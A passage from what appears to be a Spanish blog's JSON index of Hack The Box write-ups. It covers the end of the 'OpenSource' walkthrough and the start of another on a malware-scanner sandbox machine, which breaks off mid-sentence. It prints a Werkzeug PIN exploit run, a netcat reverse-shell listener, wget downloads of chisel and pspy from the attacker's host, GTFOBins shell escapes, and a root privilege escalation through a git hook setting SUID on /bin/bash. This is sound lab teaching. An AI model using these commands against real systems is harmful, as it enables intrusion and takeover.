\u0026gt;\u0026gt;\u0026gt; 0x0242ac110006 2485377892358 \u0026gt;\u0026gt;\u0026gt; exit()  Finalmente, necesitamos obtener el ID de máquina, pero /etc/machine-id no existe. Por tanto, tenemos que mirar /proc/sys/kernel/random/boot_id, según el exploit:\n$ read_file /proc/sys/kernel/random/boot_id 0abba663-d46d-4efb-8e26-158c2e4cb6c2  Ahora podemos configurar los parámetros en el exploit de Python para obtener el PIN para la consola:\n$ python3 pin_exploit.py 101-705-652  Si este PIN no funciona, tenemos que añadir un valor de /proc/self/cgroups:\n$ read_file /proc/self/cgroup 12:freezer:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 11:rdma:/ 10:hugetlb:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 9:pids:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 8:memory:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 7:cpuset:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 6:net_cls,net_prio:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 5:devices:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 4:blkio:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 3:cpu,cpuacct:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 2:perf_event:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 1:name=systemd:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 0::/system.slice/snap.docker.dockerd.service  Específicamente, tendríamos que agregar\n1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb\nal ID de máquina (0abba663-d46d-4efb-8e26-158c2e4cb6c2), y ejecutar el exploit otra vez:\n$ python3 pin_exploit.py 115-017-757  Si sigue sin funcionar, podemos cambiar el hash MD5 a SHA1 o viceversa.\nFinalmente, tenemos un PIN válido para entrar a la consola.\nLo primero que notamos es que el contenedor no tiene Bash, pero sí nc, por lo que podemos usar un payload de reverse shell para acceder al sistema. Este es el comando (tomado de pentestmonkey.net):\nY conseguimos la conexión de vuelta:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.164. Ncat: Connection from 10.10.11.164:42081. /bin/sh: can't access tty; job control turned off /app # python3 -c 'import pty; pty.spawn(\"/bin/sh\")' /app # ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm /app # export TERM=xterm /app # stty rows 50 columns 158  Enumeración del contenedor Podemos confirmar que estamos en un contenedor Docker (existe un archivo llamado .dockerenv y la dirección IP es 172.17.0.6):\n/app # ls -la / total 68 drwxr-xr-x 1 root root 4096 Jul 4 01:27 . drwxr-xr-x 1 root root 4096 Jul 4 01:27 .. -rwxr-xr-x 1 root root 0 Jul 4 01:27 .dockerenv drwxr-xr-x 1 root root 4096 May 4 16:35 app drwxr-xr-x 1 root root 4096 Mar 17 05:52 bin drwxr-xr-x 5 root root 340 Jul 4 01:27 dev drwxr-xr-x 1 root root 4096 Jul 4 01:27 etc drwxr-xr-x 2 root root 4096 May 4 16:35 home drwxr-xr-x 1 root root 4096 May 4 16:35 lib drwxr-xr-x 5 root root 4096 May 4 16:35 media drwxr-xr-x 2 root root 4096 May 4 16:35 mnt drwxr-xr-x 2 root root 4096 May 4 16:35 opt dr-xr-xr-x 230 root root 0 Jul 4 01:27 proc drwx------ 1 root root 4096 Jul 4 01:53 root drwxr-xr-x 1 root root 4096 Jul 4 01:27 run drwxr-xr-x 1 root root 4096 Mar 17 05:52 sbin drwxr-xr-x 2 root root 4096 May 4 16:35 srv dr-xr-xr-x 13 root root 0 Jul 4 01:27 sys drwxrwxrwt 1 root root 4096 Jul 4 01:52 tmp drwxr-xr-x 1 root root 4096 May 4 16:35 usr drwxr-xr-x 1 root root 4096 May 4 16:35 var /app # ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 12: eth0@if13: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN\u0026gt; mtu 1500 qdisc noqueue state UP link/ether 02:42:ac:11:00:06 brd ff:ff:ff:ff:ff:ff inet 172.17.0.6/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever  Aquí tenemos que recordar que el puerto 3000 estaba filtrado en la máquina, a lo mejor podemos acceder a este puerto desde el contenedor, usando la red 172.17.0.0/16:\n/app # wget -qO- 172.17.0.1:3000 | head \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\"en-US\" class=\"theme-\"\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\"utf-8\"\u0026gt; \u0026lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u0026gt; \u0026lt;title\u0026gt; Gitea: Git with a cup of tea\u0026lt;/title\u0026gt; \u0026lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL29wZW5zb3VyY2UuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9vcGVuc291cmNlLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vb3BlbnNvdXJjZS5odGI6MzAwMC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19\"/\u0026gt; \u0026lt;meta name=\"theme-color\" content=\"#6cc644\"\u0026gt; \u0026lt;meta name=\"default-theme\" content=\"auto\" /\u0026gt; \u0026lt;meta name=\"author\" content=\"Gitea - Git with a cup of tea\" /\u0026gt;  Reenvío de puertos Aquí está. Para acceder a esta página desde el navegador, tenemos que usar chisel para realizar un reenvío de puertos.\n$ python3 -m http.server Serving HTTP on :: port 8000 (http://[::]:8000/) ... ::ffff:10.10.11.164 - - [] \"GET /chisel HTTP/1.1\" 200 -  /app # cd /tmp /tmp # wget 10.10.17.44:8000/chisel -qO .chisel /tmp # chmod +x .chisel  $ ./chisel server -p 1234 --reverse server: Reverse tunnelling enabled server: Fingerprint FX/QSjEzTqjMotC2jW9Y5lk6gKLr5IlopGmfEndFGhU= server: Listening on http://0.0.0.0:1234 server: session#1: tun: proxy#R:3000=\u0026gt;172.17.0.1:3000: Listening  /tmp # ./.chisel client 10.10.17.44:1234 R:3000:172.17.0.1:3000 client: Connecting to ws://10.10.17.44:1234 client: Connected (Latency 81.99391ms)  Acceso a Gitea Ahora podemos ir a http://127.0.0.1:3000 y ver una aplicación web de Gitea:\nEste es un gestor de repositorios Git open-source (como GitHub). Podemos listar los usuarios registrados:\nExiste uno llamado dev01\u0026hellip; Vamos a intentar iniciar sesión usando las credenciales que tenemos de antes:\nY estamos dentro:\nExiste un repositorio llamado home-backup, y contiene archivos que deberían estar en el directorio personal del usuario:\nVamos a entrar en .ssh y coger la clave privada de SSH (id_rsa):\nUna manera de obtener estos archivos es con git, a través del túnel:\n$ git clone http://127.0.0.1:3000/dev01/home-backup.git Clonando en 'home-backup'... Username for 'http://127.0.0.1:3000': dev01 Password for 'http://dev01@127.0.0.1:3000': remote: Counting objects: 11, done. remote: Compressing objects: 100% (8/8), done. remote: Total 11 (delta 0), reused 0 (delta 0) Desempaquetando objetos: 100% (11/11), 5.77 KiB | 1.44 MiB/s, listo.  Ahora, vamos a acceder por SSH usando la clave privada:\n$ chmod 600 home-backup/.ssh/id_rsa $ ssh -i home-backup/.ssh/id_rsa dev01@10.10.11.164 dev01@opensource:~$ cat user.txt d2d88b24d324fb497c67d10a9c691310  Enumeración del sistema Una enumeración básica no muestra nada útil:\ndev01@opensource:~$ id uid=1000(dev01) gid=1000(dev01) groups=1000(dev01) dev01@opensource:~$ sudo -l [sudo] password for dev01: Sorry, user dev01 may not run sudo on opensource. dev01@opensource:~$ find / -perm -4000 2\u0026gt;/dev/null | grep -v snap /bin/fusermount /bin/umount /bin/mount /bin/su /bin/ping /usr/lib/eject/dmcrypt-get-device /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/bin/passwd /usr/bin/traceroute6.iputils /usr/bin/newgrp /usr/bin/newuidmap /usr/bin/chsh /usr/bin/at /usr/bin/gpasswd /usr/bin/newgidmap /usr/bin/sudo /usr/bin/chfn  Si usamos pspy para enumerar procesos en ejecución, veremos algunos comandos de Git que son interesantes:\ndev01@opensource:~$ cd /tmp dev01@opensource:/tmp$ wget 10.10.17.44:8000/pspy64s -qO .pspy dev01@opensource:/tmp$ chmod +x .pspy dev01@opensource:/tmp$ ./.pspy  ... CMD: UID=0 PID=2689 | /usr/sbin/CRON -f CMD: UID=0 PID=2697 | /bin/bash /root/meta/app/clean.sh CMD: UID=0 PID=2696 | cp /root/config /home/dev01/.git/config CMD: UID=0 PID=2698 | /bin/bash /usr/local/bin/git-sync CMD: UID=0 PID=2702 | git commit -m Backup for 2022-07-05 CMD: UID=0 PID=2706 | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git CMD: UID=0 PID=2705 | cut -d -f1 CMD: UID=0 PID=2704 | /snap/bin/docker exec upcloud6000 hostname -i CMD: UID=0 PID=2703 | git push origin main ...  Básicamente, está confirmando nuevos cambios en un repositorio cada minuto.\nEscalada de privilegios La idea aquí es que podemos utilizar Git hooks para ejecutar scripts, bien antes del commit o bien después. Podemos ver unos comandos útiles en GTFOBins, o la misma información usando mi herramienta gtfobins-cli:\n$ gtfobins-cli --shell git git ==\u0026gt; https://gtfobins.github.io/gtfobins/git/ Shell It can be used to break out from restricted environments by spawning an interactive system shell. PAGER='sh -c \"exec sh 0\u0026lt;\u00261\"' git -p help This invokes the default pager, which is likely to be less, other functions may apply. git help config !/bin/sh The help system can also be reached from any git command, e.g., git branch. This invokes the default pager, which is likely to be less, other functions may apply. git branch --help config !/bin/sh Git hooks are merely shell scripts and in the following example the hook associated to the pre-commit action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the -C option. TF=$(mktemp -d) git init \"$TF\" echo 'exec /bin/sh 0\u0026lt;\u00262 1\u0026gt;\u00262' \u0026gt;\"$TF/.git/hooks/pre-commit.sample\" mv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\" git -C \"$TF\" commit --allow-empty -m x TF=$(mktemp -d) ln -s /bin/sh \"$TF/git-x\" git \"--exec-path=$TF\" x  Genial, vamos a introducir un comando en un archivo llamado pre-commit (sin sufijo .sample) en .git/hooks. Por ejemplo, podemos añadir permisos SUID a /bin/bash:\ndev01@opensource:/tmp$ echo 'chmod 4755 /bin/bash' \u0026gt; ~/.git/hooks/pre-commit dev01@opensource:/tmp$ chmod +x ~/.git/hooks/pre-commit dev01@opensource:/tmp$ ls -l /bin/bash -rwxr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash  Después de algunos segundos, el script se ejecuta por root al hacer git commit y /bin/bash se convierte en binario SUID:\ndev01@opensource:/tmp$ ls -l /bin/bash -rwsr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash  Entonces, podemos ejecutar Bash como root y obtener la flag root.txt:\ndev01@opensource:/tmp$ bash -p bash-4.4# cat /root/root.txt a470e19e4c146962df93f39de9df63e7  ","image":"/images/HTB/OpenSource/OpenSource.png","permalink":"https://7rocky.github.io/htb/opensource/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web que expone su código fuente, siendo vulnerable a Directory Path Traversal. Con esta vulnerabilidad podemos leer los archivos necesarios para calcular el PIN de la consola de depuración de Flask y obtener ejecución remota de comandos en un contenedor Docker. Después, se necesita usar un reenvío de puertos para ver una instancia de Gitea y acceder con credenciales que se encuentran en un repositorio de Git. Aquí podemos ver la clave privada de SSH de un usuario de sistema. Existe una tarea Cron que confirma nuevos cambios de un repositorio Git que lleva a escalada de privilegios","time":12,"title":"OpenSource"},{"contents":"  SO: Linux   Dificultad: Insana   Dirección IP: 10.10.11.141   Fecha: 29 / 01 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.141 -p 22,80 Nmap scan report for 10.10.11.141 Host is up (0.061s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 6a:7b:14:68:97:01:4a:08:6a:e1:37:b1:d2:bd:8f:3f (RSA) | 256 f6:b4:e1:10:f0:7b:38:48:66:34:c2:c6:28:ff:b8:25 (ECDSA) |_ 256 c9:8b:96:19:51:e7:ce:1f:7d:3e:44:e9:a4:04:91:09 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Malware Scanner |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.60 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración web Si vamos a http://10.10.11.141, veremos una página web como esta:\nNos dice que han desarrollado una sandbox segura que utiliza chroot, espacios de nombre de usuario y ptrace. Tenemos otra página en la que subir un binario con malware:\nSolo por probar, vamos a compilar un programa sencillo en C como este:\n#include \u0026lt;stdio.h\u0026gt; int main() { printf(\"Hello, World!\\n\"); return 0; }  $ gcc hello.c -o hello  Lo subimos y veremos este reporte de llamadas de sistema usadas por el binario:\nEn este punto tenemos que analizar el código fuente de la sandbox y de la aplicación web.\nAnálisis del código de la sandbox Esta es la función main del programa:\nint main(int argc, char** argv) { if (argc \u0026lt; 2) { printf(\"Usage: %s \u0026lt;program\u0026gt; [uuid]\\n\", argv[0]); exit(-2); } if (strlen(argv[1]) \u0026gt; FILENAME_MAX - 50) { DIE(\"Program name too long\"); } if ((argv[1][0]) != '/') { DIE(\"Program path must be absolute\"); } umask(0); check_caps(); int result = mkdir(\"jails\", 0771); if (result == -1 \u0026amp;\u0026amp; errno != EEXIST) { DIE( \"Could not create jail directory\"); } char uuid[33] = {0}; if (argc \u0026lt; 3) { generate_uuid(uuid); } else { memcpy(uuid, argv[2], 32); } uuid[32] = 0; make_jail(uuid, argv[1]); }  La primera comprobación es que el binario sandbox tenga suficientes capabilities:\nvoid check_caps() { struct user_cap_header_struct header; struct user_cap_data_struct caps; char pad[32]; header.version = _LINUX_CAPABILITY_VERSION_3; header.pid = 0; caps.effective = caps.inheritable = caps.permitted = 0; syscall(SYS_capget, \u0026amp;header, \u0026amp;caps); if (!(caps.effective \u0026amp; 0x2401c0)) { DIE(\"Insufficient capabilities\"); } }  Podemos usar capsh para decodificar la representación hexadecimal de 0x2401c0 a nombres de capabilities:\n$ capsh --decode=0x2401c0 0x00000000002401c0=cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin  Vemos que el binario tiene esas capabilities, que son muy interesantes.\nLuego, hace algunas configuraciones en el sistema de archivos y finalmente llama a make_jail:\nvoid make_jail(char* name, char* program) { jailsfd = open(\"jails\", O_RDONLY|__O_DIRECTORY); if (faccessat(jailsfd, name, F_OK, 0) == 0) { DIE(\"Jail name exists\"); } int result = mkdirat(jailsfd, name, 0771); if (result == -1 \u0026amp;\u0026amp; errno != EEXIST) { DIE( \"Could not create the jail\"); } if (access(program, F_OK) != 0) { DIE(\"Program does not exist\"); } chdir(\"jails\"); chdir(name); copy_libs(); do_namespaces(); copy(program, \"./userprog\"); if (chroot(\".\")) {DIE(\"Couldn't chroot #1\");} if (setgid(1001)) {DIE(\"SGID\");} if (setegid(1001)) {DIE(\"SEGID\");} if (setuid(1001)) {DIE(\"SUID\");}; if (seteuid(1001)) {DIE(\"SEUID\");}; do_trace(); sleep(3); }  Otra función interesante es copy_libs:\nvoid copy_libs() { char* libs[] = {\"libc.so.6\", NULL}; char path[FILENAME_MAX] = {0}; char outpath[FILENAME_MAX] = {0}; system(\"mkdir -p bin usr/lib/x86_64-linux-gnu usr/lib64; cp /bin/sh bin\"); for (int i = 0; libs[i] != NULL; i++) { sprintf(path, \"/lib/x86_64-linux-gnu/%s\", libs[i]); // sprintf(path, \"/lib/%s\", libs[i]); sprintf(outpath, \"./usr/lib/%s\", libs[i]); copy(path, outpath); } copy(\"/lib64/ld-linux-x86-64.so.2\", \"./usr/lib64/ld-linux-x86-64.so.2\"); system(\"ln -s usr/lib64 lib64; ln -s usr/lib lib; chmod 755 -R usr bin\"); }  Que muestra que dentro de la jaula tenemos Glibc y /bin/sh.\nY otra función importante es do_namespaces:\nvoid do_namespaces() { if (unshare(CLONE_NEWPID|CLONE_NEWNET) != 0) {DIE(\"Couldn't make namespaces\");}; // Create pid-1 if (fork() != 0) {sleep(6); exit(-1);} mkdir(\"./proc\", 0555); mount(\"/proc\", \"./proc\", \"proc\", 0, NULL); }  Esta realiza algo de lo que se puede abusar. Está montando el directorio /proc de un proceso hijo de sandbox en la jaula. Este hecho será útil para la explotación, ya que podremos leer información del proceso de sandbox.\nFinalmente, la función make_jail crea el entorno de chroot y se cambia a dicho directorio, configura los permisos de usuario y grupo como UID/GID 1001 y finalmente llama a do_trace para monitorizar el comportamiento del malware:\nvoid do_trace() { // We started with capabilities - we must reset the dumpable flag // so that the child can be traced prctl(PR_SET_DUMPABLE, 1, 0, 0, 0, 0); // Remove dangerous capabilities before the child starts struct user_cap_header_struct header; struct user_cap_data_struct caps; char pad[32]; header.version = _LINUX_CAPABILITY_VERSION_3; header.pid = 0; caps.effective = caps.inheritable = caps.permitted = 0; syscall(SYS_capget, \u0026amp;header, \u0026amp;caps); caps.effective = 0; caps.permitted = 0; syscall(SYS_capset, \u0026amp;header, \u0026amp;caps); int child = fork(); if (child == -1) { DIE(\"Couldn't fork\"); } if (child == 0) { do_child(); } int killer = fork(); if (killer == -1) { DIE(\"Couldn't fork (2)\"); } if (killer == 0) { do_killer(child); } else { do_log(child); } }  Esta función es algo larga, pero no es compleja. Lo que hace primero es dividir el proceso y llamar a do_child, que básicamente habilita que el binario con malware se pueda trazar con ptrace y lo ejecuta con execve:\nvoid do_child() { // Prevent child process from escaping chroot close(jailsfd); prctl(PR_SET_PDEATHSIG, SIGHUP); ptrace(PTRACE_TRACEME, 0, NULL, NULL); char* args[] = {NULL}; execve(\"/userprog\", args, NULL); DIE(\"Couldn't execute user program\"); }  Después, divide el proceso de nuevo y mata la ejecución del malware tras 5 segundos con do_killer:\nvoid do_killer(int pid) { sleep(5); if (kill(pid, SIGKILL) == -1) {DIE(\"Kill err\");} puts(\"Killed subprocess\"); exit(0); }  Al mismo tiempo, la función llama a do_log, que es una función que utiliza ptrace para extraer todas las instrucciones syscall usadas por el malware (de hecho, en una función llamada log_syscall):\nvoid log_syscall(struct user_regs_struct regs, unsigned long ret) { registers result; result.rax = regs.orig_rax; result.rdi = regs.rdi; result.rsi = regs.rsi; result.rdx = regs.rdx; result.r10 = regs.r10; result.r8 = regs.r8; result.r9 = regs.r9; result.ret = ret; int fd = open(\"/log\", O_CREAT|O_RDWR|O_APPEND, 0777); if (fd == -1) { return; } write(fd, \u0026amp;result, sizeof(registers)); close(fd); }  Todas las instrucciones de syscall se añaden al archivo log que está dentro del entorno de chroot. Y este archivo log se analiza por el servidor web y se muestra como reporte.\nAnálisis de la aplicación web También nos proporcionan el código fuente de la aplicación web, que es una aplicación en Django (un framework de Python). Los proyectos de Django tienen muchos archivos, pero la mayoría son los que vienen por defecto.\nEsta es la función que ejecuta el malware en la sandbox (scanner/views.py):\ndef handle_file(file): md5 = calculate_file_md5(file) path = f\"{settings.FILE_PATH}/{md5}\" with open(path, 'wb+') as f: for chunk in file.chunks(): f.write(chunk) os.system(f\"cd {settings.SBX_PATH}; ./sandbox {path} {md5}\") os.remove(path) return md5  Podríamos pensar en injección de comandos debido a la interpolación de strings, pero ninguna de las variables son externas, por lo que no podemos controlarlas.\nDentro de viewer/views.py se ven dos funciones:\ndef view_file(request, md5: str): path = f\"{settings.SBX_PATH}/jails/{md5}\" if not os.path.exists(path): raise Http404(\"A sample with this hash has not been uploaded.\") logfile = f\"{path}/log\" if not os.path.exists(logfile): return HttpResponse(\"There was an error logging this application\") syscalls = [call.render() for call in parse_log(logfile)] ignore = list(filter(lambda call: call[0] == SyscallClass.Ignore, syscalls)) low = list(filter(lambda call: call[0] == SyscallClass.Low, syscalls)) med = list(filter(lambda call: call[0] == SyscallClass.Medium, syscalls)) high = list(filter(lambda call: call[0] == SyscallClass.High, syscalls)) render_vars = {\"md5\": md5, \"ignore\": ignore, \"low\": low, \"med\": med, \"high\": high} return render(request, 'view.html', render_vars) def parse_log(path): syscalls = [] with open(path, 'rb') as f: chunk = f.read(8 * 8) nums = struct.unpack(\"q\" * 8, chunk) while len(chunk) == 8*8: nums = struct.unpack(\"q\" * 8, chunk) call = LoggedSyscall(nums) syscalls.append(call) chunk = f.read(8 * 8) return syscalls  Estas funciones se utilizan para parsear el archivo log generado por el binario sandbox, y lo renderiza en el reporte.\nSe ve otro archivo llamado viewer/syscalls.py donde las instrucciones syscall del archivo log se clasifican en función de la configuración de registros ($rax, $rdi, $rsi\u0026hellip;):\nimport numbers import enum from typing import List, Tuple class SyscallClass(enum.Enum): Ignore = 0 Low = 1 Medium = 2 High = 3 def __gt__(self, other): if isinstance(other, numbers.Real): return self.value \u0026gt; other return self.value \u0026gt; other.value def __lt__(self, other): if isinstance(other, numbers.Real): return self.value \u0026lt; other return self.value \u0026lt; other.value # Class, name, syscall number, arg count syscalls = [ [SyscallClass.Low, \"read\", 0, 3], [SyscallClass.Low, \"write\", 1, 3], [SyscallClass.Medium, \"open\", 2, 3], [SyscallClass.Low, \"close\", 3, 1], [SyscallClass.Medium, \"stat\", 4, 2], [SyscallClass.Medium, \"fstat\", 5, 2], [SyscallClass.Medium, \"lstat\", 6, 2], [SyscallClass.Medium, \"access\", 21, 2], [SyscallClass.Low, \"alarm\", 37, 1], [SyscallClass.High, \"socket\", 41, 3], [SyscallClass.High, \"connect\", 42, 3], [SyscallClass.High, \"accept\", 43, 3], [SyscallClass.High, \"shutdown\", 48, 2], [SyscallClass.High, \"bind\", 49, 3], [SyscallClass.High, \"listen\", 50, 2], [SyscallClass.Medium, \"clone\", 56, 5], [SyscallClass.Medium, \"fork\", 57, 0], [SyscallClass.Medium, \"vfork\", 58, 0], [SyscallClass.High, \"execve\", 59, 3], [SyscallClass.High, \"kill\", 62, 2], [SyscallClass.Medium, \"uname\", 63, 1], [SyscallClass.Medium, \"getdents\", 78, 3], [SyscallClass.Medium, \"getcwd\", 79, 2], [SyscallClass.Medium, \"chdir\", 80, 1], [SyscallClass.Medium, \"fchdir\", 81, 1], [SyscallClass.High, \"rename\", 82, 2], [SyscallClass.Low, \"mkdir\", 83, 2], [SyscallClass.High, \"rmdir\", 84, 1], [SyscallClass.High, \"unlink\", 87, 1], [SyscallClass.Medium, \"chmod\", 90, 2], [SyscallClass.Medium, \"fchmod\", 91, 2], [SyscallClass.High, \"chown\", 92, 3], [SyscallClass.High, \"fchown\", 93, 3], [SyscallClass.High, \"ptrace\", 101, 4], ] template = \"\"\"\u0026lt;div class=\"alert alert-{}\" style=\"width: 80%\" role=\"alert\"\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;{}({}) = {}\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \"\"\" class LoggedSyscall: sys_num: int rdi: int rsi: int rdx: int r10: int r8: int r9: int ret: int def __init__(self, values): self.sys_num, self.rdi, self.rsi, self.rdx, \\ self.r10, self.r8, self.r9, self.ret = values def get_args(self, count) -\u0026gt; List[int]: if count == 0: return [] if count == 1: return [self.rdi] if count == 2: return [self.rdi, self.rsi] if count == 3: return [self.rdi, self.rsi, self.rdx] if count == 4: return [self.rdi, self.rsi, self.rdx, self.r10] if count == 5: return [self.rdi, self.rsi, self.rdx, self.r10, self.r8] if count == 6: return [self.rdi, self.rsi, self.rdx, self.r10, self.r8, self.r9] def render(self) -\u0026gt; Tuple[SyscallClass, str]: status = \"light\" for sys_entry in syscalls: if sys_entry[2] == self.sys_num: if sys_entry[0] == SyscallClass.Low: status = \"success\" elif sys_entry[0] == SyscallClass.Medium: status = \"warning\" elif sys_entry[0] == SyscallClass.High: status = \"danger\" rendered = template.format(status, f\"{sys_entry[1]}\", \", \".join([ hex(x) for x in self.get_args(sys_entry[3]) ]), hex(self.ret)) return sys_entry[0], rendered rendered = template.format(status, f\"sys_{self.sys_num}\", \"\", hex(self.ret)) return SyscallClass.Ignore, rendered  Abusando de malas configuraciones En primer lugar, podemos intentar escapar de la jaula chroot con la técnica tradicional de crear otro entorno de chroot, escalar hacia arriba hasta el directorio raíz real y llamar a chroot de nuevo. No obstante, esto no es posible porque el entorno de chroot está correctamente configurado.\nPara poder realizar pruebas en local, copié los archivos fuente en esta máquina e inicié el mismo proyecto que ellos tienen:\n$ python3 manage.py migrate Operations to perform: Apply all migrations: admin, auth, contenttypes, sessions Running migrations: Applying contenttypes.0001_initial... OK Applying auth.0001_initial... OK Applying admin.0001_initial... OK Applying admin.0002_logentry_remove_auto_add... OK Applying admin.0003_logentry_add_action_flag_choices... OK Applying contenttypes.0002_remove_content_type_name... OK Applying auth.0002_alter_permission_name_max_length... OK Applying auth.0003_alter_user_email_max_length... OK Applying auth.0004_alter_user_username_opts... OK Applying auth.0005_alter_user_last_login_null... OK Applying auth.0006_require_contenttypes_0002... OK Applying auth.0007_alter_validators_add_error_messages... OK Applying auth.0008_alter_user_username_max_length... OK Applying auth.0009_alter_user_last_name_max_length... OK Applying auth.0010_alter_group_name_max_length... OK Applying auth.0011_update_proxy_permissions... OK Applying auth.0012_alter_user_first_name_max_length... OK Applying sessions.0001_initial... OK $ python3 manage.py runserver Watching for file changes with StatReloader Performing system checks... System check identified no issues (0 silenced). Django version 3.2.6, using settings 'malscanner.settings' Starting development server at http://127.0.0.1:8000/ Quit the server with CONTROL-C.  Como los escapes de chroot tradicionales no funcionan, vamos a hacer cosas más sencillas. Por ejemplo, podemos tratar de listar directorios desde la perspectiva del malware con este script en C:\n#include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { DIR* dr; struct dirent *de; dr = opendir(\".\"); if (dr == NULL) { printf(\"Could not open current directory\"); return 1; } while ((de = readdir(dr)) != NULL) { printf(\"%s\\n\", de-\u0026gt;d_name); } closedir(dr); return 0; }  Lo compilamos y lo subimos y vemos la siguiente salida en el log del servidor:\n[] \"GET /scanner/upload HTTP/1.1\" 301 0 [] \"GET /scanner/upload/ HTTP/1.1\" 200 2189 usr . lib userprog bin proc .. lib64 log Exited [] \"POST /scanner/upload/ HTTP/1.1\" 302 0 [] \"GET /viewer/ce6407480db61da2177849329f4aeb83 HTTP/1.1\" 301 0 [] \"GET /viewer/ce6407480db61da2177849329f4aeb83/ HTTP/1.1\" 200 18239  Genial, tenemos esos archivos y directorios. Podemos seguir enumerando el sistema de archivos localmente desde el log del servidor, pero al final tendremos que encontrar una manera de obtener una salida.\nDe hecho, una manera muy ingeniosa es utilizando el archivo log. Podemos introducir la información que queremos exfiltrar como si fuera una instrucción syscall en log, de manera que el servidor lo muestre en el reporte. Luego, podremos extraer la información:\nPodemos hacer uso de las mismas funciones que hay en tracing.c del código fuente y escribir en el archivo log:\n#include \u0026lt;dirent.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; typedef struct __attribute__((__packed__)) { unsigned long rax; unsigned long rdi; unsigned long rsi; unsigned long rdx; unsigned long r10; unsigned long r8; unsigned long r9; unsigned long ret; } registers; void log_syscall(registers regs, unsigned long ret) { registers result; result.rax = regs.rax; result.rdi = regs.rdi; result.rsi = regs.rsi; result.rdx = regs.rdx; result.r10 = regs.r10; result.r8 = regs.r8; result.r9 = regs.r9; result.ret = ret; int fd = open(\"/log\", O_CREAT|O_RDWR|O_APPEND, 0777); if (fd == -1) { return; } write(fd, \u0026amp;result, sizeof(registers)); close(fd); } int main() { DIR* dr; struct dirent *de; registers regs; unsigned long ret; regs.rax = 0x3b; regs.rdi = 0x41414141; regs.rsi = 0x42424242; regs.rdx = 0x43434343; regs.r10 = 0x44444444; regs.r8 = 0x45454545; regs.r9 = 0x46464646; ret = 0x47474747; dr = opendir(\".\"); if (dr == NULL) { printf(\"Could not open current directory\"); return 1; } while ((de = readdir(dr)) != NULL) { printf(\"%s\\n\", de-\u0026gt;d_name); } log_syscall(regs, ret); closedir(dr); return 0; }  El script anterior registrará un sys_execve ($rax = 0x3b) usando números reconocibles como valores de registros. Si lo subimos y miramos la 